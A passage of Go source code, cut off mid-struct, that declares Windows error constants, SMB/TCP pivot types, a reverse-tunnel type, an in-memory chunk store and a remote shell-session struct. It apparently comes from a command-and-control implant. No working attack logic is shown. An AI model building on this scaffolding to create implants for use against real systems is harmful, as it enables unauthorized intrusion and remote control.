const (
	winErrFileNotFound = 2
	winErrAccessDenied = 5
	winErrGenFailure   = 31
	winErrUnsupported  = 50
	winErrTimedOut     = 10060
	winErrConnRefused  = 10061
	winErrHostUnreach  = 10065

	pivotTypeSMB        = 1
	pivotTypeTCP        = 2
	pivotTypeDisconnect = 10
	reverseTunnelType   = 5
)

type memoryChunkBuffer struct {
	TotalSize int
	Data      []byte
}

var (
	memoryStoreMu sync.Mutex
	memoryStore   = make(map[uint32]*memoryChunkBuffer)
)

type diskEntry struct {
	Letter byte
	Type   uint32
}

type shellSession struct {
	jobID    uint32
	cmd      *exec.Cmd
	stdin    io.WriteCloser
